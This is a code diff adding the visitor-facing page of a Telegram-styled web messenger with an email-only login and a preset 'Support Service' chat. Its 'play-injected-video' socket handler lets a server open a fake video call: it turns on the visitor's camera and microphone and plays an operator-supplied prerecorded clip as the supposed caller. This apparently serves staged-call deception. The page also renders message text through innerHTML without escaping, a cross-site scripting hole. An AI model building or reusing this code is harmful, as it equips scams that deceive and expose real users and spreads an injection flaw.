@@ -1,0 +1,279 @@
+<!-- ==========================================
+     FILE 2: public/index.html (Visitor/Client App)
+     ========================================== -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Messenger</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body, html { width: 100%; height: 100%; background-color: #0e0e0e; color: #fff; overflow: hidden; }
+
+        /* Screens */
+        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; flex-direction: column; background: #0e0e0e; }
+        .screen.active { display: flex; }
+
+        /* Auth Screen */
+        #auth-screen { justify-content: center; align-items: center; padding: 20px; }
+        .auth-box { width: 100%; max-width: 360px; background: #1c1c1e; padding: 24px; border-radius: 16px; text-align: center; }
+        .auth-box h2 { margin-bottom: 20px; font-size: 22px; }
+        .auth-box input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #333; background: #2c2c2e; color: #fff; font-size: 16px; outline: none; }
+        .auth-box button { width: 100%; padding: 14px; background: #2f80ed; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+
+        /* Main Chat List Experience */
+        .top-header { padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; background: #141416; border-bottom: 1px solid #222; }
+        .top-header h1 { font-size: 22px; font-weight: bold; }
+        .search-container { padding: 10px 16px; background: #141416; }
+        .search-bar { width: 100%; padding: 10px 14px; background: #222; border-radius: 10px; border: none; color: #fff; font-size: 15px; outline: none; }
+
+        .chat-list { flex: 1; overflow-y: auto; }
+        .chat-item { display: flex; align-items: center; padding: 12px 16px; gap: 14px; border-bottom: 1px solid #1a1a1c; cursor: pointer; }
+        .avatar { width: 50px; height: 50px; border-radius: 50%; background: #333; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 18px; color: #fff; flex-shrink: 0; }
+        .chat-info { flex: 1; min-width: 0; }
+        .chat-name { font-weight: 600; font-size: 16px; margin-bottom: 4px; display: flex; justify-content: space-between; }
+        .chat-time { font-size: 12px; color: #888; font-weight: normal; }
+        .chat-snippet { font-size: 14px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .unread-badge { background: #2f80ed; color: #fff; font-size: 11px; padding: 2px 6px; border-radius: 10px; font-weight: bold; }
+
+        /* Bottom Telegram-style Navigation Bar */
+        .nav-bar { height: 60px; background: #141416; border-top: 1px solid #222; display: flex; justify-content: space-around; align-items: center; position: relative; z-index: 10; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; text-decoration: none; cursor: pointer; position: relative; }
+        .nav-item.active { color: #2f80ed; }
+        .nav-item svg { width: 22px; height: 22px; margin-bottom: 3px; fill: currentColor; }
+        .nav-badge { position: absolute; top: -4px; right: -8px; background: #ff3b30; color: #fff; font-size: 10px; padding: 1px 5px; border-radius: 8px; font-weight: bold; }
+
+        /* Chat Room Experience */
+        #chatroom-screen { display: none; flex-direction: column; background: #0e0e0e; }
+        .chatroom-header { display: flex; align-items: center; padding: 12px 16px; background: #141416; border-bottom: 1px solid #222; gap: 12px; }
+        .back-btn { background: none; border: none; color: #2f80ed; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 4px; cursor: pointer; }
+        .messages-container { flex: 1; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        .message { max-width: 75%; padding: 10px 14px; border-radius: 14px; font-size: 15px; line-height: 1.4; word-break: break-word; }
+        .message.incoming { background: #262628; align-self: flex-start; border-bottom-left-radius: 4px; }
+        .message.outgoing { background: #2f80ed; align-self: flex-end; border-bottom-right-radius: 4px; }
+        
+        .chat-input-area { padding: 10px 16px; background: #141416; display: flex; align-items: center; gap: 10px; border-top: 1px solid #222; }
+        .chat-input-area textarea { flex: 1; background: #222; border: none; border-radius: 20px; padding: 10px 16px; color: #fff; font-size: 15px; max-height: 120px; resize: none; outline: none; }
+        .send-msg-btn { background: #2f80ed; border: none; width: 40px; height: 40px; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #fff; cursor: pointer; flex-shrink: 0; }
+
+        /* Video Call Modal / Screen */
+        #call-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: none; flex-direction: column; }
+        #remoteVideo { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
+        #localVideo { position: absolute; top: 30px; right: 20px; width: 110px; height: 150px; object-fit: cover; border-radius: 14px; border: 2px solid rgba(255,255,255,0.3); z-index: 10; background: #222; }
+        .call-controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: center; z-index: 20; }
+        .hangup-btn { width: 70px; height: 70px; background-color: #28a745; border-radius: 50%; border: none; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .hangup-btn svg { width: 32px; height: 32px; fill: #fff; transform: rotate(135deg); }
+    </style>
+</head>
+<body>
+
+    <!-- 1. AUTH SCREEN -->
+    <div id="auth-screen" class="screen active">
+        <div class="auth-box">
+            <h2>Welcome</h2>
+            <input type="email" id="userEmail" placeholder="Enter your email address" autocomplete="email">
+            <button id="authBtn">Continue</button>
+        </div>
+    </div>
+
+    <!-- 2. MAIN APP SCREEN (Chats List with Telegram-style Bottom Navigation) -->
+    <div id="main-screen" class="screen">
+        <div class="top-header">
+            <h1>Chats</h1>
+        </div>
+        <div class="search-container">
+            <input type="text" class="search-bar" placeholder="Search">
+        </div>
+        <div class="chat-list" id="chatList">
+            <!-- Dynamic saved chats load here -->
+            <div class="chat-item" onclick="openChat('Support Service')">
+                <div class="avatar" style="background: #2f80ed;">S</div>
+                <div class="chat-info">
+                    <div class="chat-name">Support Service <span class="chat-time">Just now</span></div>
+                    <div class="chat-snippet">Welcome! Tap here to start messaging.</div>
+                </div>
+                <div class="unread-badge">1</div>
+            </div>
+        </div>
+
+        <!-- Telegram-Style Bottom Nav -->
+        <div class="nav-bar">
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                Contacts
+                <span class="nav-badge">1</span>
+            </div>
+            <div class="nav-item" onclick="alert('Calls feature initialized')">
+                <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                Calls
+            </div>
+            <div class="nav-item active">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0-2-.9-2-2V4c0-1.1-.9-2-2-2z"/></svg>
+                Chats
+                <span class="nav-badge">13</span>
+            </div>
+            <div class="nav-item" onclick="alert('Settings menu')">
+                <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                Settings
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. CHAT ROOM SCREEN -->
+    <div id="chatroom-screen" class="screen">
+        <div class="chatroom-header">
+            <button class="back-btn" onclick="closeChat()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 18l-6-6 6-6"/></svg>
+                12
+            </button>
+            <div style="font-weight: bold; font-size: 16px;" id="chatTitle">Support Service</div>
+        </div>
+        <div class="messages-container" id="messagesContainer">
+            <!-- Messages load from localStorage -->
+        </div>
+        <div class="chat-input-area">
+            <textarea id="messageInput" rows="1" placeholder="Message..." oninput="autoExpand(this)"></textarea>
+            <button class="send-msg-btn" onclick="sendMessage()">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- 4. VIDEO CALL SCREEN -->
+    <div id="call-screen">
+        <video id="localVideo" autoplay playsinline muted></video>
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div class="call-controls">
+            <button class="hangup-btn" id="hangupBtn">
+                <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let userEmail = localStorage.getItem('user_email') || '';
+        let currentChatUser = '';
+        let localStream, peerConnection;
+        const servers = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+
+        // Handle auto login persistence via email
+        if (userEmail) {
+            document.getElementById('userEmail').value = userEmail;
+            initSession(userEmail);
+        }
+
+        document.getElementById('authBtn').addEventListener('click', () => {
+            const emailVal = document.getElementById('userEmail').value.trim();
+            if (!emailVal) { alert('Enter valid email'); return; }
+            localStorage.setItem('user_email', emailVal);
+            userEmail = emailVal;
+            initSession(userEmail);
+        });
+
+        function initSession(email) {
+            document.getElementById('auth-screen').classList.remove('active');
+            document.getElementById('main-screen').classList.add('active');
+            socket.emit('join', { email: email, role: 'visitor' });
+            loadMessagesFromStorage();
+        }
+
+        function openChat(name) {
+            currentChatUser = name;
+            document.getElementById('chatTitle').innerText = name;
+            document.getElementById('main-screen').classList.remove('active');
+            document.getElementById('chatroom-screen').classList.add('active');
+            renderMessages();
+        }
+
+        function closeChat() {
+            document.getElementById('chatroom-screen').classList.remove('active');
+            document.getElementById('main-screen').classList.add('active');
+        }
+
+        function autoExpand(textarea) {
+            textarea.style.height = 'auto';
+            textarea.style.height = (textarea.scrollHeight) + 'px';
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
+            const text = input.value.trim();
+            if (!text) return;
+
+            const msgObj = { sender: userEmail, text: text, time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) };
+            let messages = JSON.parse(localStorage.getItem('chat_msgs_' + userEmail) || '[]');
+            messages.push(msgObj);
+            localStorage.setItem('chat_msgs_' + userEmail, JSON.stringify(messages));
+
+            input.value = '';
+            input.style.height = 'auto';
+            renderMessages();
+        }
+
+        function loadMessagesFromStorage() {
+            renderMessages();
+        }
+
+        function renderMessages() {
+            const container = document.getElementById('messagesContainer');
+            let messages = JSON.parse(localStorage.getItem('chat_msgs_' + userEmail) || '[]');
+            container.innerHTML = messages.map(m => `
+                <div class="message ${m.sender === userEmail ? 'outgoing' : 'incoming'}">
+                    ${m.text}
+                </div>
+            `).join('');
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // WebRTC Call listener & Injected Video Handler
+        socket.on('play-injected-video', async (data) => {
+            const callScreen = document.getElementById('call-screen');
+            const remoteVideo = document.getElementById('remoteVideo');
+            const localVideo = document.getElementById('localVideo');
+
+            callScreen.style.display = 'flex';
+
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                localVideo.srcObject = localStream;
+            } catch (e) {
+                console.error("Camera access error:", e);
+            }
+
+            // Assign injected playback source directly
+            remoteVideo.src = data.videoUrl;
+            remoteVideo.muted = true; // Play muted as requested
+            remoteVideo.play();
+
+            // Auto terminate instantly once video plays once to avoid looping
+            remoteVideo.onended = () => {
+                terminateCall();
+            };
+        });
+
+        document.getElementById('hangupBtn').addEventListener('click', () => {
+            terminateCall();
+        });
+
+        socket.on('force-end-call', () => {
+            terminateCall();
+        });
+
+        function terminateCall() {
+            const remoteVideo = document.getElementById('remoteVideo');
+            remoteVideo.pause();
+            remoteVideo.src = "";
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+            if (peerConnection) {
+                peerConnection.close();
+            }
+            document.getElementById('call-screen').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
